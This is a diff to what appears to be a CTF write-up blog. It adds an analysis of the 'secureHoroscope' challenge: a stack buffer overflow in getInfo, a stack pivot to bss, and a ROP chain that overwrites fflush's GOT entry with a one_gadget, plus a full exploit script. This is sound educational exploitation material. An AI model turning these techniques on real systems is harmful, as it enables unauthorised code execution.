@@ -291,7 +291,7 @@ Here the `temp` is just a global variable and it is initially 0 when the binary 
   ```
 
 <span style="color:red">
-This is the \\*worst\\* way of creating a heap challenge</span>. 
+This is the \\\*worst\\\* way of creating a heap challenge</span>. 
 
 The author `green beans` just why would did you keep all the code in main function. The decompiled code looks ugly af. And then comes those `fflush` function. 
 
@@ -416,3 +416,54 @@ io.interactive()
 ![](https://i.imgur.com/qOB9Hom.png)
 
 ![](https://i.imgur.com/iGJLhst.png)
+
+The `main` function reads 40 bytes to a 40 byte character array which is safe. And in the `getInfo` function it reads 140 bytes of user input from stdin to `info` variable which is a 100 byte character array. So there is a **stack buffer overflow** bug here. 
+
+> # Exploit
+
+- - -
+
+* Input anything you want in your first input.
+* 112 bytes of padding + RBP -> bss  + RIP -> `0x4007cf` 
+
+![](https://i.imgur.com/0TuhK8w.png)
+
+Now you can read 140 bytes of rop chain in bss and stack pivot there.
+
+* The rop chain uses the fancy `3d_gadget` ? xD. I am not going to explain on the gadget much as i have done [here](https://4n0nym4u5.netlify.app/post/asian-cyber-security-challenge-2021/) in this challenge.
+
+```yaml
+0x000000004006a8: add [rbp-0x3d], ebx; nop [rax+rax]; rep ret; 
+```
+
+* So the rop chain will change the got of `fflush` to `one_gadget` and we then stack pivot on `fflush` to run the `one_gadget`.
+
+![](https://i.imgur.com/zXILsbo.png)
+
+```python
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from time import sleep
+
+exe  = context.binary = ELF('./secureHoroscope')
+host = args.HOST or 'sechoroscope.sdc.tf'
+port = int(args.PORT or 1337)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+libc=SetupLibcELF()
+io = start()
+
+sla("To get started, tell us how you feel\n", "A")
+sla("day/year/time) and we will have your very own horoscope\n\n", b"A"*112 + p(0x6010c0+0x70) + p(0x00000000004007cf) + p(0xdeadbeef) )
+rop = add_gadget(exe.got.fflush, libc.address+0x7e790, one_shot()[1]) + pivot(exe.got.fflush)
+sl( rop.ljust(112, b"A")  + p(0x6010c0-8) + gadget("leave; ret") )
+
+io.interactive()
+```
